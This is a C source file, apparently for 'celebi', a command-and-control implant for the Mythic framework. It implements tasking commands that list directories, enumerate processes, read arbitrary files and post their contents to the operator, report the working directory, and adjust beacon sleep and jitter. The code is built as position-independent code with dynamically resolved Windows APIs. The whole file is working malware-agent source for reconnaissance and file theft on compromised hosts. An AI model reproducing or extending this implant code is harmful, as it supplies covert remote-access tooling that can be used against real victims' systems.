#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include "headers/celebi.h"

/* QoL commands: ls (UI file browser), ps (UI process browser), cat, pwd,
 * change (sleep + jitter). Structured payloads ride on the post_response
 * message and are turned into Mythic's file_browser / process_browser JSON by
 * the translation container. */

/* ---------------- imports (resolved via ror13 dfr at link time) ------- */
WINBASEAPI HANDLE WINAPI KERNEL32$FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
WINBASEAPI BOOL WINAPI KERNEL32$FindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
WINBASEAPI BOOL WINAPI KERNEL32$FindClose(HANDLE hFindFile);
WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentDirectoryA(DWORD nBufferLength, LPSTR lpBuffer);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
WINBASEAPI BOOL WINAPI KERNEL32$GetFileSizeEx(HANDLE hFile, PLARGE_INTEGER lpFileSize);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
WINBASEAPI BOOL WINAPI KERNEL32$Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
WINBASEAPI BOOL WINAPI KERNEL32$Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
WINBASEAPI BOOL WINAPI KERNEL32$QueryFullProcessImageNameW(HANDLE hProcess, DWORD dwFlags, LPWSTR lpExeName, LPDWORD lpdwSize);
WINBASEAPI BOOL WINAPI KERNEL32$ProcessIdToSessionId(DWORD dwProcessId, PDWORD pSessionId);
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
WINBASEAPI size_t MSVCRT$strlen(const char *str);
WINBASEAPI int MSVCRT$atoi(const char *str);
WINBASEAPI int MSVCRT$strcmp(const char *string1, const char *string2);

/* ---------------- helpers ---------------- */

static void itoa64(unsigned long long v, char *out) {
	char tmp[24];
	int i = 0;
	if (v == 0) { tmp[i++] = '0'; }
	while (v > 0) {
		tmp[i++] = (char)('0' + (v % 10));
		v /= 10;
	}
	int j = 0;
	while (i > 0) { out[j++] = tmp[--i]; }
	out[j] = '\0';
}

/* FILETIME (100ns since 1601) -> unix epoch milliseconds. */
static unsigned long long filetime_to_unix_ms(FILETIME ft) {
	unsigned long long t = ((unsigned long long)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
	const unsigned long long EPOCH = 116444736000000000ULL;
	return (t - EPOCH) / 10000ULL;
}

/* Wide char -> ASCII (truncating the high byte; fine for ANSI names/paths). */
static void wide_to_ascii(const WCHAR *w, char *out, int cap) {
	int i = 0;
	while (w[i] != 0 && i < cap - 1) {
		out[i] = (char)(w[i] & 0xff);
		i++;
	}
	out[i] = '\0';
}

typedef struct StrBuf {
	char *data;
	int len;
	int cap;
} StrBuf;

static void sb_init(StrBuf *b) { b->data = NULL; b->len = 0; b->cap = 0; }

static void sb_append(StrBuf *b, const char *s) {
	int slen = (int)MSVCRT$strlen(s);
	if (b->len + slen + 1 > b->cap) {
		int new_cap = b->cap == 0 ? 256 : b->cap * 2;
		while (new_cap < b->len + slen + 1) { new_cap *= 2; }
		char *nd = (char *)KERNEL32$VirtualAlloc(0, new_cap, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
		if (nd == NULL) { return; }
		if (b->data != NULL) {
			for (int i = 0; i < b->len; i++) { nd[i] = b->data[i]; }
			KERNEL32$VirtualFree(b->data, 0, MEM_RELEASE);
		}
		b->data = nd;
		b->cap = new_cap;
	}
	for (int i = 0; i < slen; i++) { b->data[b->len + i] = s[i]; }
	b->len += slen;
	b->data[b->len] = '\0';
}

static void sb_append_char(StrBuf *b, char c) {
	char s[2] = { c, 0 };
	sb_append(b, s);
}

static void sb_free(StrBuf *b) {
	if (b->data != NULL) { KERNEL32$VirtualFree(b->data, 0, MEM_RELEASE); }
	b->data = NULL;
	b->len = 0;
	b->cap = 0;
}

/* ---------------- ls ---------------- */

void agent_ls(AgentState *state, TaskInfo *task) {
	/* Big buffers live on the heap: large stack frames make mingw emit
	 * ___chkstk_ms, which crystal palace cannot relocate. */
	char *path = (char *)KERNEL32$VirtualAlloc(0, 1024, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	char *pattern = (char *)KERNEL32$VirtualAlloc(0, 1100, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	char *parent_path = (char *)KERNEL32$VirtualAlloc(0, 1024, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	char *name = (char *)KERNEL32$VirtualAlloc(0, 300, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	if (path == NULL || pattern == NULL || parent_path == NULL || name == NULL) {
		agent_post(state, task, "allocation failed", STR(STATUS_COMMAND_FAILED));
		if (path) { KERNEL32$VirtualFree(path, 0, MEM_RELEASE); }
		if (pattern) { KERNEL32$VirtualFree(pattern, 0, MEM_RELEASE); }
		if (parent_path) { KERNEL32$VirtualFree(parent_path, 0, MEM_RELEASE); }
		if (name) { KERNEL32$VirtualFree(name, 0, MEM_RELEASE); }
		return;
	}

	if (task->parameters == NULL || task->parameters[0] == '\0' || task->parameters[0] == 0x09) {
		if (KERNEL32$GetCurrentDirectoryA(1024, path) == 0) {
			agent_post(state, task, "failed to get current directory", STR(STATUS_COMMAND_FAILED));
			KERNEL32$VirtualFree(path, 0, MEM_RELEASE);
			KERNEL32$VirtualFree(pattern, 0, MEM_RELEASE);
			KERNEL32$VirtualFree(parent_path, 0, MEM_RELEASE);
			KERNEL32$VirtualFree(name, 0, MEM_RELEASE);
			return;
		}
	} else {
		int plen = (int)MSVCRT$strlen(task->parameters);
		if (plen >= 1024) { plen = 1023; }
		for (int i = 0; i < plen; i++) { path[i] = task->parameters[i]; }
		path[plen] = '\0';
	}

	/* Search pattern: path + "\\*" (or path + "*" when path already ends in '\'). */
	int po = 0;
	for (int i = 0; path[i] != '\0' && po < 1090; i++) { pattern[po++] = path[i]; }
	if (po > 0 && pattern[po - 1] != '\\') { pattern[po++] = '\\'; }
	pattern[po++] = '*';
	pattern[po] = '\0';

	WIN32_FIND_DATAA fd;
	HANDLE hFind = KERNEL32$FindFirstFileA(pattern, &fd);
	if (hFind == INVALID_HANDLE_VALUE) {
		agent_post(state, task, "failed to list directory", STR(STATUS_COMMAND_FAILED));
		KERNEL32$VirtualFree(path, 0, MEM_RELEASE);
		KERNEL32$VirtualFree(pattern, 0, MEM_RELEASE);
		KERNEL32$VirtualFree(parent_path, 0, MEM_RELEASE);
		KERNEL32$VirtualFree(name, 0, MEM_RELEASE);
		return;
	}

	/* parent_path + folder name for the file browser. Roots (C:\) use an
	 * empty parent path per Mythic's convention. */
	{
		int plen = 0;
		while (path[plen] != '\0') { plen++; }
		if (plen > 0 && path[plen - 1] == '\\' && plen <= 3) {
			/* drive root like "C:\" */
			parent_path[0] = '\0';
			for (int i = 0; i < plen; i++) { name[i] = path[i]; }
			name[plen] = '\0';
		} else {
			int slash = -1;
			for (int i = 0; i < plen; i++) { if (path[i] == '\\') { slash = i; } }
			if (slash >= 0) {
				for (int i = 0; i <= slash; i++) { parent_path[i] = path[i]; }
				parent_path[slash + 1] = '\0';
				int n = 0;
				for (int i = slash + 1; i < plen && n < 298; i++) { name[n++] = path[i]; }
				name[n] = '\0';
			} else {
				parent_path[0] = '\0';
				for (int i = 0; i < plen && i < 298; i++) { name[i] = path[i]; }
				name[plen > 298 ? 298 : plen] = '\0';
			}
		}
	}

	StrBuf text;
	StrBuf fb;
	sb_init(&text);
	sb_init(&fb);

	/* line 0: parent_path \t name \t is_file \t size \t modify_ms \t access_ms \t success */
	sb_append(&fb, parent_path);
	sb_append_char(&fb, '\t');
	sb_append(&fb, name);
	sb_append_char(&fb, '\t');
	sb_append(&fb, "0");
	sb_append_char(&fb, '\t');
	sb_append(&fb, "0");
	sb_append_char(&fb, '\t');
	sb_append(&fb, "0");
	sb_append_char(&fb, '\t');
	sb_append(&fb, "0");
	sb_append_char(&fb, '\t');
	sb_append(&fb, "1");

	do {
		if (MSVCRT$strcmp(fd.cFileName, ".") == 0 || MSVCRT$strcmp(fd.cFileName, "..") == 0) {
			continue;
		}
		int is_dir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
		unsigned long long sz = ((unsigned long long)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
		unsigned long long modify_ms = filetime_to_unix_ms(fd.ftLastWriteTime);
		unsigned long long access_ms = filetime_to_unix_ms(fd.ftLastAccessTime);

		/* human-readable text output */
		if (is_dir) {
			sb_append(&text, "[DIR]   ");
			sb_append(&text, fd.cFileName);
		} else {
			char num[24];
			itoa64(sz, num);
			sb_append(&text, num);
			sb_append(&text, "  ");
			sb_append(&text, fd.cFileName);
		}
		sb_append_char(&text, '\n');

		/* file browser child line: name \t is_file \t size \t modify \t access */
		sb_append_char(&fb, '\n');
		sb_append(&fb, fd.cFileName);
		sb_append_char(&fb, '\t');
		sb_append(&fb, is_dir ? "0" : "1");
		sb_append_char(&fb, '\t');
		{
			char num[24];
			itoa64(sz, num);
			sb_append(&fb, num);
		}
		sb_append_char(&fb, '\t');
		{
			char num[24];
			itoa64(modify_ms, num);
			sb_append(&fb, num);
		}
		sb_append_char(&fb, '\t');
		{
			char num[24];
			itoa64(access_ms, num);
			sb_append(&fb, num);
		}
	} while (KERNEL32$FindNextFileA(hFind, &fd));
	KERNEL32$FindClose(hFind);

	if (text.data == NULL) { sb_append(&text, "(empty)"); }
	agent_post_ext(state, task, text.data != NULL ? text.data : "", STR(STATUS_SUCCESS), fb.data, NULL);
	sb_free(&text);
	sb_free(&fb);
	KERNEL32$VirtualFree(path, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(pattern, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(parent_path, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(name, 0, MEM_RELEASE);
}

/* ---------------- ps ---------------- */

#define TH32CS_SNAPPROCESS 0x00000002
#define PROCESS_QUERY_LIMITED_INFORMATION 0x1000

void agent_ps(AgentState *state, TaskInfo *task) {
	HANDLE snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snap == INVALID_HANDLE_VALUE) {
		agent_post(state, task, "failed to snapshot processes", STR(STATUS_COMMAND_FAILED));
		return;
	}
	PROCESSENTRY32W pe;
	pe.dwSize = sizeof(pe);

	/* Heap buffers (avoid ___chkstk_ms in the PIC). */
	char *name = (char *)KERNEL32$VirtualAlloc(0, 260, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	char *binpath = (char *)KERNEL32$VirtualAlloc(0, 520, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	WCHAR *wp = (WCHAR *)KERNEL32$VirtualAlloc(0, 520 * sizeof(WCHAR), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	if (name == NULL || binpath == NULL || wp == NULL) {
		KERNEL32$CloseHandle(snap);
		agent_post(state, task, "allocation failed", STR(STATUS_COMMAND_FAILED));
		if (name) { KERNEL32$VirtualFree(name, 0, MEM_RELEASE); }
		if (binpath) { KERNEL32$VirtualFree(binpath, 0, MEM_RELEASE); }
		if (wp) { KERNEL32$VirtualFree(wp, 0, MEM_RELEASE); }
		return;
	}

	StrBuf text;
	StrBuf ps;
	sb_init(&text);
	sb_init(&ps);

	BOOL ok = KERNEL32$Process32FirstW(snap, &pe);
	while (ok) {
		wide_to_ascii(pe.szExeFile, name, 260);

		binpath[0] = '\0';
		HANDLE hp = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
		if (hp != NULL) {
			DWORD wlen = 520;
			if (KERNEL32$QueryFullProcessImageNameW(hp, 0, wp, &wlen)) {
				wide_to_ascii(wp, binpath, 520);
			}
			KERNEL32$CloseHandle(hp);
		}
		DWORD sess = 0;
		KERNEL32$ProcessIdToSessionId(pe.th32ProcessID, &sess);

		/* text: pid \t name \t ppid \t bin_path */
		char num[24];
		itoa64(pe.th32ProcessID, num);
		sb_append(&text, num);
		sb_append_char(&text, '\t');
		sb_append(&text, name);
		sb_append_char(&text, '\t');
		itoa64(pe.th32ParentProcessID, num);
		sb_append(&text, num);
		sb_append_char(&text, '\t');
		sb_append(&text, binpath);
		sb_append_char(&text, '\n');

		/* blob: pid \t ppid \t name \t user \t arch \t bin_path \t session \t integrity \t cmdline \t start */
		itoa64(pe.th32ProcessID, num);
		sb_append(&ps, num);
		sb_append_char(&ps, '\t');
		itoa64(pe.th32ParentProcessID, num);
		sb_append(&ps, num);
		sb_append_char(&ps, '\t');
		sb_append(&ps, name);
		sb_append_char(&ps, '\t');
		sb_append_char(&ps, '\t'); /* user (not resolved) */
		sb_append_char(&ps, '\t'); /* architecture (not resolved) */
		sb_append(&ps, binpath);
		sb_append_char(&ps, '\t');
		itoa64(sess, num);
		sb_append(&ps, num);
		sb_append_char(&ps, '\t');
		sb_append_char(&ps, '0'); /* integrity level */
		sb_append_char(&ps, '\t');
		sb_append_char(&ps, '\t'); /* command line */
		sb_append_char(&ps, '\t'); /* start time */
		sb_append_char(&ps, '\n');

		ok = KERNEL32$Process32NextW(snap, &pe);
	}
	KERNEL32$CloseHandle(snap);

	if (text.data == NULL) { sb_append(&text, "(no processes)"); }
	agent_post_ext(state, task, text.data != NULL ? text.data : "", STR(STATUS_SUCCESS), NULL, ps.data);
	sb_free(&text);
	sb_free(&ps);
	KERNEL32$VirtualFree(name, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(binpath, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(wp, 0, MEM_RELEASE);
}

/* ---------------- cat ---------------- */

#define FILE_SHARE_READ  0x00000001
#define FILE_SHARE_WRITE 0x00000002

void agent_cat(AgentState *state, TaskInfo *task) {
	if (task->parameters == NULL || task->parameters[0] == '\0' || task->parameters[0] == 0x09) {
		agent_post(state, task, "missing file path", STR(STATUS_MISSING_COMMAND));
		return;
	}
	HANDLE h = KERNEL32$CreateFileA(task->parameters, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
	                                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (h == INVALID_HANDLE_VALUE) {
		agent_post(state, task, "failed to open file", STR(STATUS_COMMAND_FAILED));
		return;
	}
	LARGE_INTEGER size;
	if (!KERNEL32$GetFileSizeEx(h, &size)) {
		KERNEL32$CloseHandle(h);
		agent_post(state, task, "failed to get file size", STR(STATUS_COMMAND_FAILED));
		return;
	}
	unsigned long long sz = (unsigned long long)size.QuadPart;
	const unsigned long long CAP = 2ULL * 1024 * 1024;
	if (sz > CAP) { sz = CAP; }
	char *buf = (char *)KERNEL32$VirtualAlloc(0, (SIZE_T)sz + 1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	if (buf == NULL) {
		KERNEL32$CloseHandle(h);
		agent_post(state, task, "allocation failed", STR(STATUS_COMMAND_FAILED));
		return;
	}
	DWORD total = 0;
	while (total < (DWORD)sz) {
		DWORD n = 0;
		if (!KERNEL32$ReadFile(h, buf + total, (DWORD)sz - total, &n, NULL) || n == 0) {
			break;
		}
		total += n;
	}
	buf[total] = '\0';
	KERNEL32$CloseHandle(h);
	agent_post(state, task, buf, STR(STATUS_SUCCESS));
	KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
}

/* ---------------- pwd ---------------- */

void agent_pwd(AgentState *state, TaskInfo *task) {
	char buf[1024];
	if (KERNEL32$GetCurrentDirectoryA(sizeof(buf), buf) == 0) {
		agent_post(state, task, "failed to get current directory", STR(STATUS_COMMAND_FAILED));
		return;
	}
	agent_post(state, task, buf, STR(STATUS_SUCCESS));
}

/* ---------------- change (sleep + jitter) ---------------- */

void agent_change(AgentState *state, TaskInfo *task) {
	char *sleep_str = task->parameters;
	char *jitter_str = NULL;
	{
		char *p = task->parameters;
		while (*p != '\0') {
			if (*p == '\t') {
				*p = '\0';
				jitter_str = p + 1;
				break;
			}
			p++;
		}
	}
	int interval = MSVCRT$atoi(sleep_str);
	int jitter = (jitter_str != NULL) ? MSVCRT$atoi(jitter_str) : 0;
	if (interval <= 0) {
		agent_post(state, task, "invalid sleep interval (must be > 0 seconds)", STR(STATUS_COMMAND_FAILED));
		return;
	}
	if (jitter < 0 || jitter > 100) {
		agent_post(state, task, "invalid jitter (must be 0-100)", STR(STATUS_COMMAND_FAILED));
		return;
	}
	state->params.callback_interval = interval;
	state->params.callback_jitter = jitter;
	state->sleep_time = interval;
	agent_post(state, task, "changed", STR(STATUS_SUCCESS));
}
